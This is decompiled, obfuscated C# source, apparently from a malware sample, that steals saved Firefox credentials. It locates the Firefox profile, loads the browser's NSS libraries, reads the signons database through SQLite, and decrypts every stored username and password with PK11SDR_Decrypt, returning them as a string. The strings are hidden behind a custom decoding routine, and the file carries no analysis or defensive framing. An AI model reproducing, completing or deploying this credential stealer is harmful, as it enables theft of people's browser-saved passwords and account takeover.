using System;
using System.Collections;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic.CompilerServices;
using ns2;

namespace ns1;

[StandardModule]
internal sealed class ff
{
	public class SHITEMID
	{
		public static long cb;

		public static byte[] abID;

		[DebuggerNonUserCode]
		public SHITEMID()
		{
		}
	}

	public struct TSECItem
	{
		public int SECItemType;

		public int SECItemData;

		public int SECItemLen;
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long DLLFunctionDelegate(string configdir);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long DLLFunctionDelegate2();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);

	private static IntPtr NSS3;

	public static string signon;

	public static void Main()
	{
		sFirefox();
		Console.ReadLine();
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string dllFilePath);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	public static long NSS_Init(string configdir)
	{
		string text = Environment.GetEnvironmentVariable(GClass0.smethod_0("\\řɅ\u034eњՆ\u064b\u0743ࡍ\u094f\u0a47\u0b52")) + GClass0.smethod_0("MŝɠʹѤՠ٧ݫ\u0829\u094e੮୴ౠ\u0d62\u0e6c\u0f7aၝ");
		LoadLibrary(text + GClass0.smethod_0("aŤɰ\u036aѺճط\u073c\u082a१੮୭"));
		LoadLibrary(text + GClass0.smethod_0("gŻɷʹбԪ٧ݮ\u086d"));
		LoadLibrary(text + GClass0.smethod_0("xūɥ\u0331Ъէٮݭ"));
		LoadLibrary(text + GClass0.smethod_0("yŤɣ\u0375бԪ٧ݮ\u086d"));
		LoadLibrary(text + GClass0.smethod_0("xŹɼͼѮժضܪࡧ८੭"));
		LoadLibrary(text + GClass0.smethod_0("xŻɥ\u0361ѳգضܪࡧ८੭"));
		LoadLibrary(text + GClass0.smethod_0("bŸɹͼѼծ٪\u0736\u082a१੮୭"));
		LoadLibrary(text + GClass0.smethod_0("\u007fŤɬͽѧլ٨\u0736\u082a१੮୭"));
		NSS3 = LoadLibrary(text + GClass0.smethod_0("fŴɵ\u0336Ъէٮݭ"));
		IntPtr procAddress = GetProcAddress(NSS3, GClass0.smethod_0("FŔɕ\u035aэխ٫ݵ"));
		DLLFunctionDelegate dLLFunctionDelegate = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate));
		return dLLFunctionDelegate(configdir);
	}

	public static long PK11_GetInternalKeySlot()
	{
		IntPtr procAddress = GetProcAddress(NSS3, GClass0.smethod_0("GŝȤ\u0325ьՕٴݤࡆॠ\u0a79୩౹\u0d64\u0e68ཤ၌ᅣቼፗᑯᕭᙵ"));
		DLLFunctionDelegate2 dLLFunctionDelegate = (DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate2));
		return dLLFunctionDelegate();
	}

	public static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
	{
		IntPtr procAddress = GetProcAddress(NSS3, GClass0.smethod_0("AśȾ\u033fђՍپݾࡡ७੩୲౬൧\u0e62\u0f76\u1064"));
		DLLFunctionDelegate3 dLLFunctionDelegate = (DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate3));
		return dLLFunctionDelegate(slot, loadCerts, wincx);
	}

	public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
	{
		IntPtr procAddress = GetProcAddress(NSS3, GClass0.smethod_0("Xņɇ\u0351ѳբٵ\u0739࠺\u0952\u0a48୮౩൦\u0e6cར၄ᅰቢ፥ᑧᕳ"));
		DLLFunctionDelegate4 dLLFunctionDelegate = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate4));
		return dLLFunctionDelegate(arenaOpt, outItemOpt, inStr, inLen);
	}

	public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
	{
		IntPtr procAddress = GetProcAddress(NSS3, GClass0.smethod_0("_Ņȼ\u033dјՎ\u065bݗࡃ\u0963੦୶౺൲\u0e75"));
		DLLFunctionDelegate5 dLLFunctionDelegate = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate5));
		return dLLFunctionDelegate(ref data, ref result, cx);
	}

	public static string sFirefox()
	{
		checked
		{
			try
			{
				Path.GetTempPath();
				bool flag = false;
				long num = 0L;
				_ = Environment.GetEnvironmentVariable(GClass0.smethod_0("\\řɅ\u034eњՆ\u064b\u0743ࡍ\u094f\u0a47\u0b52")) + GClass0.smethod_0("MŝɠʹѤՠ٧ݫ\u0829\u094e੮୴ౠ\u0d62\u0e6c\u0f7aၝ");
				string path = Environment.GetEnvironmentVariable(GClass0.smethod_0("FŖɕ\u0340тՖـ")) + GClass0.smethod_0("Eŕɸ\u036cѼոٿݳࡍ\u0956੦\u0b7c౨൪\u0e64\u0f72ၕᅘት፩ᑣᕭᙯᝧᡲ");
				string[] directories = Directory.GetDirectories(path);
				string[] array = directories;
				foreach (string text in array)
				{
					if (flag)
					{
						break;
					}
					string[] files = Directory.GetFiles(text);
					string[] array2 = files;
					foreach (string input in array2)
					{
						if (flag)
						{
							break;
						}
						if (Regex.IsMatch(input, GClass0.smethod_0("}Ťɫ\u0365ѥէٻܩ\u0875ॴ੨୪\u0c76\u0d64")))
						{
							NSS_Init(text);
							signon = input;
						}
					}
				}
				string baseName = signon;
				TSECItem tSECItem = default(TSECItem);
				TSECItem result = default(TSECItem);
				TSECItem result2 = default(TSECItem);
				SQLiteBase sQLiteBase = new SQLiteBase(baseName);
				string text2 = null;
				DataTable dataTable = sQLiteBase.ExecuteQuery(GClass0.smethod_0("Jŝɛ\u0353іՀس\u0738࠱\u0956\u0a5d\u0b41\u0c40ബ\u0e66ཥ\u1073ᅗቫ፩ᑢᕭ᙭\u1771ᠺ"));
				sQLiteBase.ExecuteQuery(GClass0.smethod_0("sŚɒ\u0358џՏغ\u0733࠸\u0951\u0a44\u0b5aౙള\u0e7f\u0f7e\u106aᅐቪ፤ᑿᕪᙨᝥᡭᥣᩎ᭪ᱷᵷṱἺ"));
				num = PK11_GetInternalKeySlot();
				PK11_Authenticate(num, loadCerts: true, 0L);
				text2 = GClass0.smethod_0("LŠɺ\u0362рժټ\u0738࠸\u093a");
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = dataTable.Rows.GetEnumerator();
					while (enumerator.MoveNext())
					{
						DataRow dataRow = (DataRow)enumerator.Current;
						string text3 = Convert.ToString(dataRow[GClass0.smethod_0("kţɹ\u0367њս٥ݫ\u086c॰\u0a56\u0b50\u0c4d")].ToString());
						if (Operators.CompareString(text3, GClass0.smethod_0(""), false) != 0)
						{
							text2 = text2 + text3 + GClass0.smethod_0("8ĸȺ");
						}
						StringBuilder stringBuilder = new StringBuilder(dataRow[GClass0.smethod_0("tžɬͼѴռٿݯ\u086dढ़ੴ\u0b63౷൪\u0e62\u0f6f\u1064")].ToString());
						int value = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
						IntPtr ptr = new IntPtr(value);
						TSECItem data = (TSECItem)Marshal.PtrToStructure(ptr, typeof(TSECItem));
						if (PK11SDR_Decrypt(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
						{
							byte[] array3 = new byte[result.SECItemLen - 1 + 1];
							ptr = new IntPtr(result.SECItemData);
							Marshal.Copy(ptr, array3, 0, result.SECItemLen);
							text2 = text2 + Encoding.ASCII.GetString(array3) + GClass0.smethod_0("8ĸȺ");
						}
						StringBuilder stringBuilder2 = new StringBuilder(dataRow[GClass0.smethod_0("tžɬͼѴռٿݯ\u086dक़੦୵\u0c76൳\u0e6c\u0f70ၥ")].ToString());
						int value2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
						ptr = new IntPtr(value2);
						TSECItem data2 = (TSECItem)Marshal.PtrToStructure(ptr, typeof(TSECItem));
						if (PK11SDR_Decrypt(ref data2, ref result2, 0) == 0 && result2.SECItemLen != 0)
						{
							byte[] array3 = new byte[result2.SECItemLen - 1 + 1];
							ptr = new IntPtr(result2.SECItemData);
							Marshal.Copy(ptr, array3, 0, result2.SECItemLen);
							text2 = text2 + Encoding.ASCII.GetString(array3) + GClass0.smethod_0("+ĵȵͳЧյ\u064cݠ\u087a\u0962\u0a40୪౼സ\u0e38༺");
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				return text2;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result3 = null;
				ProjectData.ClearProjectError();
				return result3;
			}
		}
	}
}
